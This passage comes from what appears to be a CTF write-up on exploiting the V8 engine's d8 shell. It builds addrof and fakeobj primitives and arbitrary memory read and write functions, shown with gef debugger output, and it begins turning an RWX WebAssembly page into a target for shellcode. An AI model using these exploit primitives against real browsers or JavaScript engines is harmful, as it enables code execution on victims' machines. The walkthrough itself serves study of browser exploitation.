</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">elements</span> <span class="no">kind</span><span class="p">:</span> <span class="no">PACKED_ELEMENTS</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">unused</span> <span class="no">property</span> <span class="no">fields</span><span class="p">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">enum</span> <span class="no">length</span><span class="p">:</span> <span class="no">invalid</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">back</span> <span class="no">pointer</span><span class="p">:</span> <span class="mi">0x194f08243925</span> <span class="err">&lt;</span><span class="no">Map</span><span class="p">(</span><span class="no">HOLEY_DOUBLE_ELEMENTS</span><span class="p">)</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">prototype_validity</span> <span class="no">cell</span><span class="p">:</span> <span class="mi">0x194f08182445</span> <span class="err">&lt;</span><span class="no">Cell</span> <span class="no">value</span><span class="err">=</span> <span class="mi">1</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">instance</span> <span class="no">descriptors</span> <span class="c1">#1: 0x194f0820abd9 &lt;DescriptorArray[1]&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="err">-</span> <span class="nf">transitions</span> <span class="c1">#1: 0x194f0820ac55 &lt;TransitionArray[4]&gt;Transition array #1:
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>     <span class="err">0</span><span class="nf">x194f08044f5d</span> <span class="err">&lt;</span><span class="no">Symbol</span><span class="p">:</span> <span class="p">(</span><span class="no">elements_transition_symbol</span><span class="p">)</span><span class="err">&gt;</span><span class="p">:</span> <span class="p">(</span><span class="no">transition</span> <span class="no">to</span> <span class="no">HOLEY_ELEMENTS</span><span class="p">)</span> <span class="p">-</span><span class="err">&gt;</span> <span class="mi">0x194f08243975</span> <span class="err">&lt;</span><span class="no">Map</span><span class="p">(</span><span class="no">HOLEY_ELEMENTS</span><span class="p">)</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">prototype:</span> <span class="err">0</span><span class="nf">x194f0820a555</span> <span class="err">&lt;</span><span class="no">JSArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">constructor:</span> <span class="err">0</span><span class="nf">x194f0820a429</span> <span class="err">&lt;</span><span class="no">JSFunction</span> <span class="no">Array</span> <span class="p">(</span><span class="no">sfi</span> <span class="err">=</span> <span class="mi">0x194f0818b399</span><span class="p">)</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">dependent</span> <span class="no">code</span><span class="p">:</span> <span class="mi">0x194f080421e1</span> <span class="err">&lt;</span><span class="no">Other</span> <span class="no">heap</span> <span class="no">object</span> <span class="p">(</span><span class="no">WEAK_FIXED_ARRAY_TYPE</span><span class="p">)</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">construction</span> <span class="no">counter</span><span class="p">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[{</span><span class="nl">a:</span> <span class="err">1}]</span>
</span></span><span class="line"><span class="cl"><span class="nf">d8</span><span class="err">&gt;</span> <span class="err">&#34;</span><span class="mi">0</span><span class="no">x</span><span class="err">&#34;+</span><span class="no">ftoi</span><span class="p">(</span><span class="no">aux_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">64</span><span class="p">).</span><span class="no">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">&#34;0</span><span class="nf">x8084e7d00000002</span><span class="err">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nf">d8</span><span class="err">&gt;</span> 
</span></span></code></pre></div><blockquote>
<p>Remember, when analysing the address, be sure to subtract 1 from it since pointers are tagged.</p>
</blockquote>
<p>Success, we changed the element pointer of the <code>JSArray</code> i.e. <code>aux_arr</code> then after that we check the first element of the <code>aux_arr</code> since we put the fake map object i.e. the address of the  <code>obj_arr</code> then when we tend to see the content of the element it&rsquo;ll result in the leak of the <code>obj_arr</code>&rsquo;s map. In the context of JIT exploitation, this is what we call <code>addrof</code> since we can get the address of an arbitrary object from the engine.</p>
<p>Now, we have to write <code>addrof</code> as a function to help later in the exploit:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">aux_arr</span> <span class="o">=</span> <span class="nx">aux_float_arr</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">aux_float_arr</span><span class="p">)</span> <span class="c1">// slice the array to access the map and the element pointer 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">aux_arr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">aux_arr</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="mi">64</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff00000000</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">elem_obj_arr</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span> <span class="c1">// Change the element pointer to the address of `obj_arr`&#39;s element&#39;s
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">aux_obj_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">;</span> <span class="c1">// Place the object at 0th index
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">aux_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">32</span><span class="p">)</span> <span class="c1">// Get the address of the object
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></div><p>The <code>fakeobj</code> function:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">fake</span><span class="p">;</span>    <span class="c1">// Declare the fake variable
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">aux_arr</span> <span class="o">=</span> <span class="nx">aux_float_arr</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">aux_float_arr</span><span class="p">);</span> <span class="c1">// slice the array to access the map and the element pointer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">aux_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>                  <span class="c1">// Make the 0th index the address
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">aux_arr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">aux_arr</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">64</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff00000000</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">obj_arr_map</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span> <span class="c1">// Change the map of the array to object&#39;s map
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">fake</span> <span class="o">=</span> <span class="nx">aux_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> 
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">fake</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>We will see how both of these functions can be used in the arbitrary read and write, don&rsquo;t worry if you don&rsquo;t understand because the next section is very detailed.</p>
<h1 id="arbitrary-rw" class="relative group">Arbitrary r/w <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#arbitrary-rw" aria-label="Anchor">#</a></span></h1><p>From start to end, we had this one goal to get an arbitrary read/write primitive, now it&rsquo;s time to see it in action. First off, we will start off with the arbitray read and see how we can read any arbitrary address with the use of <code>fakeobj</code> and <code>addrof</code>.</p>
<p>To perform arbitrary read, what we will do is create a float array and make the element of the 0th index of the float array to the value of the float array&rsquo;s map using <code>slice</code>. Then we set the value of the map to of a fake object then the 3rd index of the float array will be treated as the elemnt pointer of the fake object.</p>
<p>Let&rsquo;s see it in the <code>d8</code> shell itself:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">d8</span><span class="err">&gt;</span> <span class="no">var</span> <span class="no">a</span> <span class="err">=</span> <span class="p">[</span><span class="mi">1</span><span class="no">.1</span><span class="p">,</span> <span class="mi">1</span><span class="no">.2</span><span class="p">,</span> <span class="mi">1</span><span class="no">.3</span><span class="p">]</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">undefined</span>
</span></span><span class="line"><span class="cl"><span class="nf">d8</span><span class="err">&gt;</span> <span class="nv">%DebugPrint</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">DebugPrint:</span> <span class="err">0</span><span class="nl">x369d08086c99:</span> <span class="err">[</span><span class="nf">JSArray</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">map:</span> <span class="err">0</span><span class="nf">x369d082438fd</span> <span class="err">&lt;</span><span class="no">Map</span><span class="p">(</span><span class="no">PACKED_DOUBLE_ELEMENTS</span><span class="p">)</span><span class="err">&gt;</span> <span class="p">[</span><span class="no">FastProperties</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> <span class="err">--</span> <span class="nf">snip</span> <span class="p">--</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="no">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">10</span><span class="no">xg</span> <span class="mi">0x369d08086c99</span> <span class="p">-</span> <span class="mi">0x30</span> <span class="p">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x369d08086c68:</span>	<span class="err">0</span><span class="nf">x0000000008086c39</span>	<span class="mi">0x08042211fffffffe</span> 
</span></span><span class="line"><span class="cl"><span class="mi">0x369d08086c78</span><span class="p">:</span>	<span class="mi">0x0000000608042a31</span>	<span class="mi">0x3ff199999999999a</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x369d08086c88:</span>	<span class="err">0</span><span class="nf">x3ff3333333333333</span>	<span class="mi">0x3ff4cccccccccccd</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x369d08086c98:</span>	<span class="err">0</span><span class="nf">x080426dd082438fd</span>	<span class="mi">0x0000000608086c79</span> <span class="err">&lt;</span><span class="p">----</span> <span class="no">JSArray</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x369d08086ca8:</span>	<span class="err">0</span><span class="nf">xd15095f608042545</span>	<span class="mi">0x626544250000000f</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">element:</span> <span class="err">`0</span><span class="nf">x369d08086c68</span><span class="err">`</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">th</span> <span class="no">element</span><span class="p">:</span> <span class="err">`</span><span class="mi">0x369d08086c80</span><span class="err">`</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">The</span> <span class="no">address</span> <span class="err">`</span><span class="mi">0x369d08086c80</span><span class="err">`</span> <span class="no">points</span> <span class="no">to</span> <span class="no">the</span> <span class="no">first</span> <span class="no">element</span> <span class="no">of</span> <span class="no">the</span> <span class="no">JSArray</span><span class="p">,</span> <span class="no">if</span> <span class="no">we</span> <span class="no">change</span> <span class="no">this</span> <span class="no">to</span> <span class="no">the</span> <span class="no">map</span> <span class="no">of</span> <span class="no">the</span> <span class="no">fake</span> <span class="no">object</span>
</span></span><span class="line"><span class="cl"><span class="nf">Then</span> <span class="no">the</span> <span class="no">address</span> <span class="err">`</span><span class="mi">0x369d08086c98</span><span class="err">`</span> <span class="no">would</span> <span class="no">be</span> <span class="no">treated</span> <span class="no">as</span> <span class="no">fake</span> <span class="no">object</span> <span class="no">element</span> <span class="no">pointer</span><span class="p">,</span> <span class="no">so</span> <span class="no">when</span> <span class="no">we</span> <span class="no">try</span> <span class="no">to</span> <span class="no">read</span> <span class="no">the</span> <span class="no">fake_object</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="no">it</span> <span class="no">will</span> <span class="no">show</span> <span class="no">the</span> <span class="no">address</span> <span class="no">of</span> <span class="no">whatever</span> <span class="no">value</span> <span class="no">is</span> <span class="no">stored</span> <span class="no">at</span> <span class="no">the</span> <span class="no">address</span> <span class="err">`</span><span class="mi">0x369d08086c98</span> <span class="err">+</span> <span class="mi">0x10</span><span class="err">`</span><span class="p">.</span>
</span></span></code></pre></div><p>Let&rsquo;s do this by calling our previous functions <code>fakeobj</code> and <code>addrof</code>:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">rw_helper</span> <span class="o">=</span> <span class="p">[</span><span class="nx">itof</span><span class="p">(</span><span class="nx">flt_arr_map</span><span class="p">,</span> <span class="mi">64</span><span class="p">),</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">,</span> <span class="mf">3.3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">rw_helper_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">rw_helper</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Controlled RW helper address: 0x&#34;</span> <span class="o">+</span> <span class="nx">rw_helper_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">rw_helper_addr</span> <span class="o">-</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">rw_helper</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="mh">0x8</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">addr</span> <span class="o">-</span> <span class="mh">0x8</span><span class="nx">n</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span></code></pre></div><p>What we doing here is, using the <code>rw_helper</code> to be used as the float array then we create a fake objected at the <code>rw_helper_addr - 0x20n</code> then we make the 1st index of the <code>rw_helper</code>&rsquo;s 1st index to the address of the <code>addr</code>, then once we try to access the 0th index value from the <code>rw_helper</code> it&rsquo;ll give us the value stored at the <code>addr</code>.</p>
<p>Running this:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">r</span> <span class="p">--</span><span class="no">shell</span> <span class="p">--</span><span class="no">allow-natives-syntax</span> <span class="err">~/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">xpl.js</span> 
</span></span><span class="line"><span class="cl"><span class="no">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mian</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">d8</span> <span class="p">--</span><span class="no">shell</span> <span class="p">--</span><span class="no">allow-natives-syntax</span> <span class="err">~/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">xpl.js</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">Thread</span> <span class="no">debugging</span> <span class="no">using</span> <span class="no">libthread_db</span> <span class="no">enabled</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Using</span> <span class="no">host</span> <span class="no">libthread_db</span> <span class="no">library</span> <span class="err">&#34;/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libthread_db.so.1</span><span class="err">&#34;</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">New</span> <span class="no">Thread</span> <span class="mi">0x7ffff7006700</span> <span class="p">(</span><span class="no">LWP</span> <span class="mi">3206</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Float</span> <span class="no">array</span> <span class="no">map</span><span class="p">:</span> <span class="mi">0x82438fd</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Pointer</span> <span class="no">to</span> <span class="no">array</span> <span class="no">elements</span><span class="p">:</span> <span class="mi">0x8085321</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Pointer</span> <span class="no">to</span> <span class="no">object</span> <span class="no">array</span> <span class="no">elements</span><span class="p">:</span> <span class="mi">0x8085265</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Object</span> <span class="no">array</span> <span class="no">map</span><span class="p">:</span> <span class="mi">0x824394d</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Controlled</span> <span class="no">RW</span> <span class="no">helper</span> <span class="no">address</span><span class="p">:</span> <span class="mi">0x8085711</span>
</span></span><span class="line"><span class="cl"><span class="nf">V8</span> <span class="no">version</span> <span class="mi">8</span><span class="no">.7.9</span>
</span></span><span class="line"><span class="cl"><span class="nf">d8</span><span class="err">&gt;</span> <span class="err">&#34;</span><span class="mi">0</span><span class="no">x</span><span class="err">&#34;+</span><span class="no">ftoi</span><span class="p">(</span><span class="no">rw_helper</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">32</span><span class="p">).</span><span class="no">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">&#34;0</span><span class="nf">x82438fd</span><span class="err">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">--</span> <span class="nf">snip</span> <span class="p">--</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="no">xg</span> <span class="mi">0x8085711</span> <span class="err">+</span> <span class="mi">0x00003e3a00000000</span> <span class="p">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x3e3a08085710:</span>	<span class="err">0</span><span class="nf">x080426dd082438fd</span>
</span></span></code></pre></div><p>Awesome, we successfully got the value of the <code>rw_helper</code>&rsquo;s array address. Now, we need to leverage this to the arbitrary write, before moving on let&rsquo;s make a function <code>arb_read</code>:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">rw_helper_addr</span> <span class="o">-</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">rw_helper</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="mh">0x8</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">addr</span> <span class="o">-</span> <span class="mh">0x8</span><span class="nx">n</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Just like the arbitrary read, we will use the <code>fakeobj</code> and <code>addrof</code> to write to a memory location. What we will do here is we inject a fake object i.e. <code>rw_helper</code> array&rsquo;s address then we make the 1st index of the <code>rw_helper</code> pointing to the address we want to write to. then we do <code>fake[0] = val</code>, we will write the value to the address pointed by the <code>fake</code>&rsquo;s 0th index.</p>
<p>For now, let&rsquo;s create a function named <code>arb_write</code> which is based on the logic above:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">rw_helper_addr</span> <span class="o">-</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">rw_helper</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="mh">0x8</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">addr</span> <span class="o">-</span> <span class="mh">0x8</span><span class="nx">n</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h1 id="shellcode-and-profit" class="relative group">Shellcode and Profit <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#shellcode-and-profit" aria-label="Anchor">#</a></span></h1><p>Although, because of the pointer compression we can&rsquo;t just directly write to any hook functions and just let it be called, because of the pointer compression we can only write to the heap addresspace but as suggest on the article that I linked earlier, it is mentioned that we can create a WebAssembly Page which is by default marked as <code>RWX</code> which is perfect candidate for the shellcode. If we create a wasm function whose address can be leaked somehow then we can write shellcode to it with the <code>arb_write</code> and then execute the function, we will create one with some garbage data which doesn&rsquo;t even matter as long as it creates a <code>RWX</code> page. Now, what we will do from here is to first create a <code>RWX</code> page then find it via <code>gef</code>, the best way as I have learned from the other writeups is use <code>debug</code> version of <code>d8</code> and then find it with some trial and error:-</p>
<p>Let&rsquo;s create a wasm function first and see the base address of the <code>RWX</code> page via <code>vmmap</code>, add the following lines of code to the <code>xpl.js</code>:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">wasmCode</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                               <span class="mi">130</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                               <span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                               <span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                               <span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">11</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">wasm_module</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasmCode</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">wasm_instance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasm_module</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">pwn</span> <span class="o">=</span> <span class="nx">wasm_instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>
</span></span></code></pre></div><p>Now, let&rsquo;s run it with the debug version of <code>d8</code> that we <strong>build</strong>:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">r</span> <span class="p">--</span><span class="no">shell</span> <span class="p">--</span><span class="no">allow-natives-syntax</span> <span class="err">~/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">xpl.js</span> 
